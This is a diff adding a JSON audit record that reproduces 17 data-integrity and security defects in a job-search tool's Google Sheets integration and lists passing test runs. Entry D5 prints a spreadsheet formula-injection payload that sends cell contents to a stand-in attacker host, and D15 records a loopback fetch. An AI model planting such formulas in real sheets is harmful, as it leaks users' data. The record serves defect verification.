@@ -1,0 +1,314 @@
+{
+ "could_not_run": [],
+ "lane": "D",
+ "sha": "f227fbb",
+ "summary": "Reproduced all 17 CONFIRMED/P0-P1 findings (D1-D13, D15-D17, D19) with byte-identical probe output to the report; all 17 focused test files pass as reported (worker 81/81, root 43/43). Counts: 34 REPRODUCED, 0 NOT-REPRODUCED, 0 UNCLEAR, 0 could_not_run. Working tree left clean and no probe server left running.",
+ "verdicts": [
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p01-concurrent-append-dup.mjs",
+   "id": "D1",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:720-818. Output shows both writers appending the same URL (2 rows, 1 link) and run3 only warning.",
+   "output_excerpt": "run1 {\"appended\":1,\"updated\":0}\nrun2 {\"appended\":1,\"updated\":0}\npipeline data rows: 2 links: https://boards.greenhouse.io/acme/jobs/1 , https://boards.greenhouse.io/acme/jobs/1\nrun3 warnings: [\"Found 1 duplicate existing Pipeline rows for normalized Link values.\"] rows now: 2\nDEFECT CONFIRMED: duplicate row for one URL",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p02-rowdrift-writer.mjs",
+   "id": "D2",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:788-792. Output shows Gamma's row replaced by Beta's merged row (Gamma lost, Beta duplicated).",
+   "output_excerpt": "{\"title\":\"Beta role\",\"company\":\"Beta\",\"link\":\"https://beta.example/jobs/2\",\"status\":\"Interviewing\",\"notes\":\"Beta: onsite Tue, recruiter Sam\"}\n{\"title\":\"Beta role\",\"company\":\"Beta\",\"link\":\"https://beta.example/jobs/2\",\"status\":\"Interviewing\",\"notes\":\"Beta: onsite Tue, recruiter Sam\"}\nDEFECT CONFIRMED: Gamma row overwritten by Beta's merged row (Gamma lost; Beta now duplicated)",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p03-cleanup-stale-overwrite.mjs",
+   "id": "D3",
+   "note": "Evidence integrations/browser-use-discovery/src/cleanup/expired-job-cleanup.ts:671-684. Output shows Applied reverted to Expired, user note replaced by snapshot+audit, Follow-up left set.",
+   "output_excerpt": "cleanup result: {\"checked\":2,\"updated\":2,\"postingFetches\":2}\nrow X after: {\"status\":\"Expired\",\"notes\":\"old note\\n[JobBored 2026-09-25] Marked Expired because the job page says the role is closed. Was: New.\",\"followUp\":\"2026-10-01\"}\nDEFECT CONFIRMED: user's Applied status and new note overwritten; Follow-up Date left set on an Expired row",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p05-rediscovery-overwrites-user-columns.mjs",
+   "id": "D4",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:266-312. Output shows 7 user-edited columns (Source, Salary, Fit Score, Priority, Tags, Fit Assessment, Talking Points) overwritten; Status/Notes preserved.",
+   "output_excerpt": "Source          before=\"Manual\"                     after=\"Greenhouse\"  <-- overwritten\nSalary          before=\"$150k (recruiter said)\"     after=\"$120k\u2013$140k\"  <-- overwritten\nFit Score       before=\"9\"                          after=\"6\"  <-- overwritten\nPriority        before=\"\ud83d\udd25 top\"                     after=\"medium\"  <-- overwritten\nTags            before=\"referral, dream\"            after=\"backend\"  <-- overwritten\nFit Assessment  before=\"User-provided job description:\\nFull JD pasted by   after=\"LLM: decent fit\"  <-- overwritten\nStatus          before=\"Researching\"                after=\"Researching\"\nNotes           before=\"call Sam\"                   after=\"call Sam\"\nTalking Points  before=\"my own talking points\"      after=\"LLM talking points\"  <-- overwritten\nwrite range: Pipeline!A2:Y2 valueInputOption: USER_ENTERED\nDEFECT CONFIRMED: 7 user-edited columns overwritten by re-discovery",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p06-formula-injection.mjs",
+   "id": "D5",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:572,603 and integrations/browser-use-discovery/src/browser/selectors/shared.ts:46-48. Output shows unescaped =HYPERLINK/=IMAGE cells sent with USER_ENTERED.",
+   "output_excerpt": "toPlainText keeps leading '=': \"=HYPERLINK(\\\"\" \"=IMAGE(\\\"\"\nappend valueInputOption: USER_ENTERED (query param set at pipeline-writer.ts:603)\ncells B,C sent: [\"=HYPERLINK(\\\"https://attacker.invalid/?leak=\\\"&C2,\\\"Senior Engineer\\\")\",\"=IMAGE(\\\"https://attacker.invalid/px.gif\\\")\"]\nDEFECT CONFIRMED: formula text written unescaped with USER_ENTERED",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p08-patcher-header-drift.mjs",
+   "id": "D6",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-patcher.ts:166-221. Output shows matched:true with stage/note written into Contact/Applied Date columns instead of Status/Notes.",
+   "output_excerpt": "patch result: {\"matched\":true,\"matchedBy\":\"url\",\"rowNumber\":2}\n  column M \"Contact\": \"Sam\" -> \"Interviewing\"\n  column O \"Applied Date\": \"\" -> \"[2026-09-25] onsite booked\"\nDEFECT CONFIRMED: Status unchanged, stage and note written into the wrong columns, HTTP 200 returned",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p09-pipeline-update-applied-and-note-race.mjs",
+   "id": "D7",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-patcher.ts:203-210. Output shows stage=Applied persisting status only, with appliedDate and followUp empty.",
+   "output_excerpt": "after stage=Applied: {\"status\":\"Applied\",\"appliedDate\":\"\",\"followUp\":\"\"}\nPIPE-04 worker half CONFIRMED: Applied with no Applied Date / Follow-up Date / audit note",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p09-pipeline-update-applied-and-note-race.mjs",
+   "id": "D8",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-patcher.ts:96-102,214-216. Output shows two concurrent note appends collapsing to one surviving note.",
+   "output_excerpt": "notes after two concurrent appends: \"[2026-09-25] Hermes follow-up sent\\nseed\"\nDEFECT CONFIRMED: one concurrent note lost",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p04-cleanup-all-or-nothing.mjs",
+   "id": "D9",
+   "note": "Evidence integrations/browser-use-discovery/src/cleanup/expired-job-cleanup.ts:621-743 and scripts/run-scheduled-expired-cleanup.mjs:187-193. Output shows zero flushed writes across 5 fetches and a single terminal batchUpdate.",
+   "output_excerpt": "Sheet writes already flushed at each posting fetch: [0,0,0,0,0]\ntotal batchUpdate calls: 1\nrows fetched serially at the default 15s timeout before the 45-min kill: 180\nDEFECT CONFIRMED: writes are flushed only after the last row; a killed pass persists 0 rows and repeats the same fetches the next night",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p13-browser-writer-divergence.mjs",
+   "id": "D10",
+   "note": "Evidence sheets-writeback.js:470-498,:640-643. Output shows markStatusExpired writing M only while the board path writes M plus cleared P; worker-cleanup cell set (M+O audit, P kept) corroborated by the p03 output above.",
+   "output_excerpt": "browser markStatusExpired (Brief/review)     Pipeline!M2=\"Expired\"\nbrowser updateJobStatus(Expired) (board)     Pipeline!M2=\"Expired\"  Pipeline!P2=\"\"",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p13-browser-writer-divergence.mjs",
+   "id": "D11",
+   "note": "Evidence submission-flow.js:204-208 and sheets-writeback.js:584-594. Output shows updateJobStatus arity 3 receiving (jobKey,'Applied',fromStage) with the evidence object dropped, writing only M plus today's date in N.",
+   "output_excerpt": "browser updateJobStatus(Applied) (submission-flow) Pipeline!M2=\"Applied\"  Pipeline!N2=\"2026-09-25\"\nupdateJobStatus arity: 3 -> submission-flow.js:204 passes (jobKey,'Applied',fromStage); evidence {appliedDate,source,receiptNote,followUpDate} is dropped",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p12-half-written.mjs",
+   "id": "D12",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:816-838 and integrations/browser-use-discovery/src/run/run-discovery.ts:1330-1360. Output shows update-503 skipping the append, and a lost append response surfacing as a plain TypeError while rows exist.",
+   "output_excerpt": "(1) update 503 -> SheetWriteError phase=update partialResult=null | append attempted: false | rows: 1\n(2) append 500 -> phase=append partialResult={\"appended\":0,\"updated\":1}\n(3) append response lost -> TypeError isSheetWriteError=false | rows actually in Sheet: 2 (run-discovery.ts:1360 rethrows non-SheetWriteError -> run marked failed although the lead was written)\n(3b) retry -> {\"appended\":0,\"updated\":2} rows: 2",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p10-runs-writer-edges.mjs",
+   "id": "D13",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/discovery-runs-writer.ts:389-417. Output shows a 429 header read treated as missing tab (created:true plus addSheet/header PUT) and legacy rows misaligned under the new 10-col header.",
+   "output_excerpt": "(a) 429 header read -> {\"ok\":true,\"created\":true} calls: values.get,spreadsheets.batchUpdate,values.update,values.append\n(b) legacy tab after append: {\"ok\":true,\"created\":false}\n    header: Run At|Trigger|Status|Duration (s)|Companies Seen|Leads New|Leads Updated|Source|Variation Key|Error\n    old row under new header -> Leads Updated= \"worker\"  Source= \"v0\"  Error= \"\"\n(c) partial row Error cell sent: \"\"",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types .lane-evidence/probes/p14-cleanup-loopback-fetch.mjs",
+   "id": "D15",
+   "note": "Evidence integrations/browser-use-discovery/src/cleanup/expired-job-cleanup.ts:415-452. HOME prefix added per lane boundary for server-starting reproducers; port 18140/127.0.0.1 as the probe binds. Output shows the loopback URL from the Sheet was fetched.",
+   "output_excerpt": "loopback hits: [\"/internal-only\"] classification: open open_marker\nDEFECT CONFIRMED: cleanup fetched a loopback URL taken from the Sheet",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p11-call-count.mjs",
+   "id": "D16",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:495-525 and integrations/browser-use-discovery/src/sheets/credential-readiness.ts:180-205. Output shows 3 token exchanges per run plus a token+read per /health poll, 8 Sheets calls total.",
+   "output_excerpt": "preflight readiness (webhook)      token: 1  sheets read: 1  sheets write: 0  [token,spreadsheets.get]\nGET /health readiness (each poll)  token: 1  sheets read: 1  sheets write: 0  [token,spreadsheets.get]\npipeline write (20 leads)          token: 1  sheets read: 3  sheets write: 2  [token,values.get,values.get,values.get,values.batchUpdate,values.append]\n  -> appended 10 updated 10 | rows read in one GET: 310\nDiscoveryRuns log                  token: 1  sheets read: 1  sheets write: 1  [token,values.get,values.append]\nTOTAL per run: token exchanges 3 (excl. /health), Sheets API calls 8",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types .lane-evidence/probes/p11-call-count.mjs",
+   "id": "D17",
+   "note": "Evidence integrations/browser-use-discovery/src/sheets/pipeline-writer.ts:720-725. Output shows the full A2:Y read (310 rows, ~37KB, linear growth) on the write path.",
+   "output_excerpt": "  -> appended 10 updated 10 | rows read in one GET: 310\nbytes of the full A2:Y read at 310 rows ~ 37227 (grows linearly; read on every write and every /ingest-url)",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node scripts/test-pipeline-contract.mjs",
+   "id": "D19",
+   "note": "Contract OK line names only README, app-config-core and pipeline-render; supporting read-only grep for 'pipeline-row' finds zero references under integrations/browser-use-discovery/tests (hits only in root tests for other consumers and scripts/test-pipeline-contract.mjs itself), confirming no test binds the worker/patcher/cleanup/browser letters to schemas/pipeline-row.v1.json.",
+   "output_excerpt": "OK schemas/pipeline-row.v1.json \u2194 README.md \u2194 app-config-core.js \u2194 pipeline-render.js\nexit=0",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/pipeline-writer.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/pipeline-writer.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/pipeline-writer.test.ts. Output shows 20/20 passing, matching the report's floor.",
+   "output_excerpt": "\u2139 tests 20\n\u2139 pass 20\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/pipeline-patcher.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/pipeline-patcher.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/pipeline-patcher.test.ts. Output shows 6/6 passing.",
+   "output_excerpt": "\u2139 tests 6\n\u2139 pass 6\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/discovery-runs-writer.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/discovery-runs-writer.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/discovery-runs-writer.test.ts. Output shows 7/7 passing.",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/expired-job-cleanup.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/expired-job-cleanup.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/expired-job-cleanup.test.ts. Output shows 8/8 passing.",
+   "output_excerpt": "\u2139 tests 8\n\u2139 pass 8\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/intake-identity.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/intake-identity.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/intake-identity.test.ts. Output shows 4/4 passing.",
+   "output_excerpt": "\u2139 tests 4\n\u2139 pass 4\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/sheets/placeholder-sheet-readiness.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/sheets/placeholder-sheet-readiness.test.ts",
+   "note": "\u00a74 worker floor file tests/sheets/placeholder-sheet-readiness.test.ts. Output shows 3/3 passing.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/webhook/handle-pipeline-update.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/webhook/handle-pipeline-update.test.ts",
+   "note": "\u00a74 worker floor file tests/webhook/handle-pipeline-update.test.ts. Output shows 12/12 passing.",
+   "output_excerpt": "\u2139 tests 12\n\u2139 pass 12\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/webhook/handle-cleanup-webhook.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/webhook/handle-cleanup-webhook.test.ts",
+   "note": "\u00a74 worker floor file tests/webhook/handle-cleanup-webhook.test.ts. Output shows 7/7 passing.",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/webhook/credential-readiness.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/webhook/credential-readiness.test.ts",
+   "note": "\u00a74 worker floor file tests/webhook/credential-readiness.test.ts. Output shows 7/7 passing.",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node --experimental-strip-types --test integrations/browser-use-discovery/tests/webhook/run-discovery-runs-log.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/webhook/run-discovery-runs-log.test.ts",
+   "note": "\u00a74 worker floor file tests/webhook/run-discovery-runs-log.test.ts. Output shows 7/7 passing. Worker total 81/81 matches the report.",
+   "output_excerpt": "\u2139 tests 7\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/pipeline-atomic-transition.test.mjs",
+   "id": "TEST:tests/pipeline-atomic-transition.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 5/5 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 5\n\u2139 pass 5\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/pipeline-move-applied-side-effects.test.mjs",
+   "id": "TEST:tests/pipeline-move-applied-side-effects.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 1/1 passing, matching the report.",
+   "output_excerpt": "\u2714 PIPE-04 writes M+N+P once through sheets-writeback side effects (3.659583ms)\n\u2139 tests 1\n\u2139 pass 1\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/expired-status-contract.test.mjs",
+   "id": "TEST:tests/expired-status-contract.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 3/3 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/favorite-persistence.test.mjs",
+   "id": "TEST:tests/favorite-persistence.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 6/6 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 6\n\u2139 pass 6\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/edit-job-field.test.mjs",
+   "id": "TEST:tests/edit-job-field.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 6/6 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 6\n\u2139 pass 6\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/schedule-installers.test.mjs",
+   "id": "TEST:tests/schedule-installers.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 11/11 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 11\n\u2139 pass 11\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=.lane-evidence/home npm test -- tests/pipeline-transition-adapter.test.mjs",
+   "id": "TEST:tests/pipeline-transition-adapter.test.mjs",
+   "note": "\u00a74 root floor file. Output shows 11/11 passing, matching the report.",
+   "output_excerpt": "\u2139 tests 11\n\u2139 pass 11\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  }
+ ]
+}
